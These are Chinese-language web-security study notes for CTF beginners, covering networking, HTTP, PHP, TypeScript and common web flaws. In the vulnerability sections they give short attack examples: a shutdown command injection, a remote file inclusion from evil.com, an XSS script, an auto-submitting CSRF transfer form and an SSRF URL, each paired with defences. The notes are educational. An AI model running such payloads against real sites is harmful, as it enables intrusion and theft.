# Web 基础

## Web 应用架构：客户端+服务端 (C/S)

!!! warning "C/S and B/S ?"
	- Client/Server分为两层，第一层是用户表示层，第二层是数据库层。需要程序员自己写客户端。
	- Browser/Server分为表示层，应用层，数据层三层，只要有浏览器就能打开
	![[一图看懂CSBS区别.png]]

桌面应用和Web应用在架构上有显著的区别。桌面应用通常是在本地运行的独立程序，而Web应用则需要依赖客户端和服务端的协作。

- 客户端：你的浏览器
    - 可视化：图形、图片、布局…… HTML + CSS
    - 人机交互逻辑：按钮点击，登录，发送请求……JS
    - 缓存、Cookie
    - 安全：不能将私密的、不该获取的信息传出去（比如 Cookie），不能为所欲为（比如注销其他网站的账号）
- 服务端：某台或很多台服务器 (任何一台计算机都可以作为服务器)
    - 认证与鉴权：如何证明你是你
        - Authentication
        - Authorization
    - 处理请求：用户需要做什么？将结果返回客户端
    - 服务器也可以有不同分工：前端后端、数据库……
    - 安全：用户不能获得不该获取的信息（比如 flag），不能为所欲为（比如任意代码执行）

!!! note "DDoS"
	分布式拒绝服务攻击，通过大量的无效请求占用服务器资源，使得合法请求无法被处理
	

## 网络：数据交换

- 数据包的传输与路由
	- 想象一下，数据包就像是一封封信件，而网络则是遍布全球的邮政系统。当我们在电脑上点击发送邮件时，数据被切割成一个个小包裹，即数据包。这些数据包随后被送往最近的邮局，也就是路由器。路由器就像邮局的分拣员，根据包裹上的地址（即IP地址），决定将它们送往下一个邮局，直至最终到达目的地。这个过程中，每个路由器都会查看数据包的目的地，并选择最佳路径，确保数据包能够快速、准确地到达。
- 域名与DNS系统
	- 在网络的世界里，IP地址就像是门牌号码，虽然精确，但记忆起来却颇为困难。这时，域名系统（DNS）就如同一个智能的电话簿，将复杂的IP地址转化为易于记忆的域名，比如 `www.example.com` 。当你在浏览器中输入一个域名时，DNS服务器会像查电话簿一样，找到对应的IP地址，并指引你的请求到达正确的服务器。
	- 一个域名下面可以有任意多条DNS记录，如映射到IPv4的A记录、映射到IPv6的AAAA记录、CNAME(别名)、TXT(文本信息)等
	- 访问一个域名的时候，计算机会向DNS服务器查询域名对应的DNS记录
		- DNS 服务器有可能继续向其他 DNS 服务器查询，直到找到所需的记录
		- 一般来说，DNS 服务器会缓存查询结果，以减少查询时间（TTL）
		- DNS 的分配端口是 TCP/UDP 53
- OSI模型和TCP/IP模型
	- 正如我们写代码层层封装，计算机网络的总体架构也是分层的。这样每个层各司其职，下层上上层的基础设施，逐渐构建复杂的功能。
	- ![[网络模型.png]]


### TCP/IP 协议详解

- IP: 网络层=主机到主机，数据包寻址（快递公司）
	- IPv1-3 主要用于实验用途，设计于1973-1978年间
	- IPv4由四个段组成，每个段为八位二进制，理论上可以有 $2^{32}$ 个不同地址(实际上有复杂的地址分配机制)
	- 2019 年 11 月 25 日，RIPE NCC 宣布 IPv4 地址耗尽

!!! example "IPv4 的地址"
	![[IP表示.png]]



- TCP/UDP: 传输层=应用到应用，或者说端到端（菜鸟驿站） 无边界的字节流，类比电报报文，电报的格式是应用层协议该做的，电报本身只发字母数字
	- TCP: 传输控制协议Transmission Control Protocol , 面向连接的协议
		- 通过复杂的握手、确认、重传等机制保证数据的顺序和可靠性
		- 具体而言是三次握手，四次摇手
	- UDP: 用户数据报协议User Datagram Protocol , 无连接；"send and forget"
		- 更简单且快速；单向传输，不保证顺序，不保证可靠性
	- 端口：软件层面的通信端点，与 IP 地址一起构成网络通信的基础
		- IP 地址识别机器，端口号识别软件（服务）
		- TCP 与 UDP 的端口号是分开的，即同一个端口号可以同时用于 TCP 和 UDP
		- 端口号的范围是0~65535，其中0~1023是系统保留端口，一般不用于通信服务

??? quote "奇怪的比喻"
	![[TCPUDP区别.png]]

### HTTP 协议详解

!!! abstract "超文本传输协议 HyperText Transfer Protocol"

- 属于应用层
- 特点：是基于文本的协议，用于在客户端和服务器之间传输网页
- 需要维持状态（比如：用户已登录）怎么办？Cookie 存在文件头中
- 格式
	- http 规定了请求报文和响应报文的形式
	- URL(统一资源定位符)只能包含ASCII字符，Encode为百分号编码

## 后端：业务逻辑

后端是Web应用的核心，它负责处理业务逻辑、数据存储和安全。

- 常见后端技术栈（如Node.js、PHP、Python、Ruby、Go、Rust 等）
- 后端安全：永远不要相信用户的数据，一切前端的过滤都等于没有过滤！
- CTF: 通过逻辑漏洞等欺骗后端
	- 注入：混淆了数据和代码。
		- 例如 `printf("%d", _____)`
		- 正常输入：`1` `2` `3`
		- 恶意输入：`1); system("shutdown -s -t 0"); //`
		- 就变成了 `printf("%d", 1); system("shutdown -s -t 0"); //)`

### PHP

PHP是最早的Web开发语言之一，它在Web开发历史上占有重要地位。

请自学

Example

```php
<!DOCTYPE html>
<html>
<head>
    <title>PHP 示例</title>
</head>
<body>
    <h1>欢迎使用 PHP</h1>
    <?php
    // 定义变量
    $name = "John";
    $age = 25;

    // 输出变量
    echo "<p>你好，我的名字是 $name，我今年 $age 岁。</p>";

    // 条件语句
    if ($age >= 18) {
        echo "<p>我已成年。</p>";
    } else {
        echo "<p>我未成年。</p>";
    }

    // 数组
    $fruits = array("apple", "banana", "cherry");
    echo "<p>我喜欢的水果有：</p>";
    echo "<ul>";
    foreach ($fruits as $fruit) {
        echo "<li>$fruit</li>";
    }
    echo "</ul>";

    // HTML 短标签
    ?>
    <p>这是使用 HTML 短标签的示例：</p>
    <?= "当前时间是：" . date("Y-m-d H:i:s") ?>
    
    <?php
    $fr = "pear";
    $pear = 114;
    $lingo = 514;
    echo $$fr;
    ?>
</body>
</html>
```

通过国内开源软件 phpstudy 搭建这个页面吧！

### SQL

入门可以从 MySQL 开始，各种SQL语法大差不差。

请自学

### 后端相关安全话题

- Cookie 与 Session
    - **Cookie**：存储在客户端的小型文本文件，通常用于存储用户的偏好设置、身份验证信息等。
        - **示例**：用户登录后，服务器发送一个包含用户ID的Cookie到客户端，客户端在后续请求中自动包含该Cookie，以便服务器识别用户。
        - **Cookie劫持**：攻击者通过XSS攻击或其他手段获取用户的Cookie，从而冒充用户身份。
    - **Session**：存储在服务器端的临时数据存储区域，通常用于存储用户的会话状态信息。
        - **示例**：用户登录后，服务器创建一个Session，并将Session ID通过Cookie发送给客户端。客户端在后续请求中包含该Session ID，服务器根据Session ID查找对应的Session数据。
        - 如果服务器被攻破，Session中就可能有一些敏感信息。
- **逻辑漏洞**：验证不充分、想当然的写法、条件竞争、未发现的旁门左道……
    - 程序员的傲慢可能会让他认为`a==1&&a==2` 一定是 false 但……
    - ![[神奇Javascript.png]]
- 任意文件读与任意代码执行
    - 例如一个Web应用允许用户上传头像，但未对上传的文件进行严格的类型和内容检查。攻击者上传一个包含恶意代码的文件，并通过文件包含漏洞执行该代码，从而控制服务器。
    - CTF竞赛中，能读服务器上 `/flag` 则读，否则就暗示我们需要 RCE (不然连 flag 在哪个文件都不知道).
- 文件包含：例如一个Web应用允许用户通过URL参数指定要包含的文件，如`index.php?page=about`。攻击者可以通过构造恶意URL，如`index.php?page=http://evil.com/malicious.php`，包含远程恶意文件，从而执行恶意代码。
- 越权：例如一个Web应用允许用户查看自己的订单信息，但未正确验证用户的身份。攻击者可以通过篡改URL参数，如`order.php?id=123`，查看其他用户的订单信息。
    - 永远不要相信用户的数据！前端代码也许永远不会访问其他用户的数据，但这不代表恶意攻击者就不会。

## 前端：可视化与操作逻辑

前端开发主要关注用户界面的设计和用户交互。

### HTML/CSS/JavaScript

你知道我要说什么，自学去吧

### TypeScript

TypeScript（简称TS）是由微软开发的一种开源编程语言，是JavaScript的超集，增加了静态类型和类等特性。

- **静态类型**：通过类型检查减少运行时错误，提高代码的可维护性(JavaScript是弱类型的语言)。

```javascript
let message: string = "Hello, TypeScript!";
```

- **类和接口**：支持面向对象编程，增强代码结构性。

```javascript
class Greeter {
	greeting: string;
    constructor(message: string) {
	    this.greeting = message;
    }
	greet() {
	    return "Hello, " + this.greeting;
	}
}

let greeter = new Greeter("world");
console.log(greeter.greet());
```

- **模块化**：支持模块化编程，提高代码复用性和组织性。

```javascript
import { add } from './math';
console.log(add(2, 3));
```

### Node.js

Node.js是由Ryan Dahl在2009年开发的一个开源、跨平台的JavaScript运行时环境，基于Chrome的V8引擎构建。Node.js的出现使得JavaScript可以用于服务器端开发。

- **起源**：Node.js诞生于对高性能、非阻塞I/O模型的需求。
- **发展**：Node.js迅速发展，成为构建高性能、可扩展网络应用的首选平台。


### 前端相关安全话题

#### XSS（跨站攻击脚本）

假设有一个留言板应用，用户可以提交留言。如果应用没有对用户输入进行过滤和编码，攻击者可以提交以下恶意留言：
```html
<script>alert('XSS 攻击！');</script>
```

当其他用户访问留言板时，这段脚本会在他们的浏览器中执行，弹出一个警告框。

**防护措施**：

- **输入验证**：在服务器端对用户输入进行严格的验证和过滤，拒绝任何可疑的输入。
- **输出编码**：在将用户输入显示在页面上时，进行适当的编码，防止恶意代码被执行。
- Content Security Policy (CSP)：在HTTP头中设置CSP策略，限制页面可以加载的资源。

#### CSRF（跨站请求伪造）与 SSRF（服务器端请求伪造）

CSRF 示例： 假设有一个转账功能，用户可以通过POST请求向指定账户转账。攻击者可以构造一个恶意页面，诱导用户点击：

```html
<form action="<https://bank.com/transfer>" method="POST">
	<input type="hidden" name="to" value="attacker"> 
	<input type="hidden" name="amount" value="1000">
</form> 
<script>document.forms[0].submit();</script>
```

用户在已登录银行网站的情况下访问该页面，会自动发起转账请求。

![[CSRF例子.png]]

**防护措施**：

- **CSRF Token**：在表单中加入随机的CSRF Token，确保请求是来自合法的来源。
- **SameSite Cookie**：设置Cookie的SameSite属性，防止跨站请求时Cookie被发送。

---

SSRF 示例： 假设有一个Web应用允许用户输入URL并获取该URL的内容。攻击者可以输入内部服务的URL，获取敏感信息：

```html
<https://example.com/fetch?url=http://internal-service:8080/secret>
```

??? tip "常用内网ip段"
	- 192.168.0.0/16 => 192.168.0.0 ~ 192.168.255.255
	- 10.0.0.0/8 => 10.0.0.0 ~ 10.255.255.255
	- 172.16.0.0/12 => 172.16.0.0 ~ 172.31.255.255
		- 实际上，判断是否是内网ip还包括 127.0.0.0/8 和 0.0.0.0/8

**防护措施**：

- **白名单机制**：限制服务器只能访问特定的内部资源或外部资源，使用白名单机制进行防护。

```javascript
ALLOWED_DOMAINS = ['example.com', 'trusted.com']

def fetch_url(url):
    parsed_url = urlparse(url)
    if parsed_url.netloc not in ALLOWED_DOMAINS:
        return "Access Denied"
    # 继续处理请求
```


[参考阅读](https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html)

所以，归纳一下，完美解决SSRF漏洞的过程如下：

1. 解析目标URL，获取其Host
2. 解析Host，获取Host指向的IP地址
3. 检查IP地址是否为内网IP
4. 请求URL
5. 如果有跳转，拿出跳转URL，执行1

#### 跨域

示例： 假设有一个Web应用需要从另一个域名加载数据，但由于同源策略，直接请求会被阻止

**防护措施**：

- **CORS（跨域资源共享）**：在服务器端设置CORS头，允许特定的域名访问资源。
- **代理服务器**：在服务器端设置代理，将跨域请求转发到目标服务器，避免直接在客户端进行跨域请求。


## 尾声
经典老番：地址栏输入网址并访问后发生了什么

1. **DNS解析（域名解析）**：
    - 浏览器会首先检查本地缓存中是否有该网址对应的IP地址。
    - 如果没有，它会向DNS服务器发送请求，查询该网址的IP地址。
    - DNS服务器返回该网址对应的IP地址给浏览器。
2. **建立TCP连接**：
    - 浏览器使用前面得到的IP地址，通过TCP/IP协议与目标服务器建立连接。
    - 这包括三次握手过程：客户端发送SYN包，服务器返回SYN-ACK包，客户端再发送ACK包确认连接。
3. **发送HTTP请求**：
    - 建立连接后，浏览器会发送一个HTTP请求到服务器。这个请求包含了请求方法（如GET或POST）、请求的资源路径以及一些头信息（如浏览器类型、可接受的文件类型等）。
4. **服务器处理请求并返回响应**：
    - 服务器接收到请求后，会处理该请求，查找请求的资源（如HTML文件、图片、视频等）。
    - 服务器会将找到的资源以及一些头信息（如内容类型、内容长度等）打包成HTTP响应，返回给浏览器。
5. **浏览器接收响应并渲染页面**：
    - 浏览器接收到服务器返回的HTTP响应后，会解析响应的头信息和内容。
    - 如果内容是HTML文件，浏览器会解析HTML并根据其中的指令（如加载CSS文件、执行JavaScript脚本等）进行渲染。
    - 浏览器会逐步构建DOM树和CSSOM树，并根据它们生成渲染树，最后将内容绘制到屏幕上。
6. **加载资源**：
    - 如果HTML文件中包含了其他资源（如图片、CSS、JavaScript等），浏览器会根据需要发送额外的HTTP请求来加载这些资源。
    - 这些资源加载完成后，浏览器会继续渲染页面，更新显示内容。

整个过程通常在短时间内完成，以确保用户能够快速看到网页内容。

